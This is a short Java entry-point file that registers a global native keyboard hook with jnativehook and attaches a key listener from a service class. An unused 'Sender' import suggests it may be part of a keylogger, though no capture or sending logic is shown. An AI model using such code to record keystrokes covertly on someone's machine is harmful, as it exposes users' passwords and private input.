package main;

import handler.ManageService;
import handler.Sender;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

public class Main {

    public static void main(String[] args) {
        ManageService service = new ManageService();
        try {
            GlobalScreen.registerNativeHook();
        } catch (Throwable e) {
            e.printStackTrace();
        }
        GlobalScreen.getInstance().addNativeKeyListener(service.getKeyboard());
    }
}